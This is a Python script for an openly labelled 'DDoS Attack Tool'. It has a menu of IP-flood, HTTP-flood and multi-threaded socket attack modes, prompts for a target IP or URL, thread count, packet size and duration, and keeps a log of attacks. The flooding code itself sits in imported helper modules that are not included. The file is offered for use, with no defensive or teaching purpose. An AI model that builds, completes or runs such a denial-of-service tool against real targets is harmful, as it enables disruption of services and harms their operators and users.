import sys
import os
import time
import random
import threading
import socket
import requests
from helpers.network import resolve_ip, create_packet
from helpers.threads import distribute_workload

# Welcome Banner
def welcome_banner():
    banner = """
    ██████╗ ██╗██████╗  ██████╗ ███████╗
    ██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝
    ██████╔╝██║██████╔╝██║  ███╗███████╗
    ██╔═══╝ ██║██╔═══╝ ██║   ██║╚════██║
    ██║     ██║██║     ╚██████╔╝███████║
    ╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝
    """
    print(f"\033[92m{banner}\033[0m")
    print("Welcome to Python DDoS Attack Tool\n")
    print("1. Basic Attack (IP Flood)")
    print("2. Advanced Attack (HTTP Flood)")
    print("3. Brutal Attack (Multi-threaded Socket)")
    print("4. Clear Log")
    print("5. Exit\n")

# Menu Interface
def menu():
    while True:
        welcome_banner()
        choice = input("Select an option: ")
        
        if choice == "1":
            start_attack("basic")
        elif choice == "2":
            start_attack("advanced")
        elif choice == "3":
            start_attack("brutal")
        elif choice == "4":
            clear_log()
        elif choice == "5":
            print("Exiting...")
            sys.exit()
        else:
            print("\033[93mInvalid choice. Please select again.\033[0m")

# Attack Method Implementation
def start_attack(mode):
    target = input("Enter IP or URL: ")
    if "http" in target:
        target_ip = resolve_ip(target)
    else:
        target_ip = target
    
    threads = int(input("Enter number of threads: "))
    packet_size = int(input("Enter packet size in bytes: "))
    duration = int(input("Enter attack duration in seconds: "))
    
    if mode == "basic":
        distribute_workload(target_ip, packet_size, threads, duration, method="basic")
    elif mode == "advanced":
        distribute_workload(target, packet_size, threads, duration, method="http")
    elif mode == "brutal":
        distribute_workload(target_ip, packet_size, threads, duration, method="brutal")

    log_attack(target, mode)

# Logging Feature
def log_attack(target, mode):
    with open("attack_log.txt", "a") as log_file:
        log_file.write(f"[{time.ctime()}] Mode: {mode} | Target: {target}\n")
    print("\033[92mAttack logged successfully.\033[0m")

def clear_log():
    with open("attack_log.txt", "w") as log_file:
        log_file.write("")
    print("\033[92mLog cleared successfully.\033[0m")

if __name__ == "__main__":
    menu()
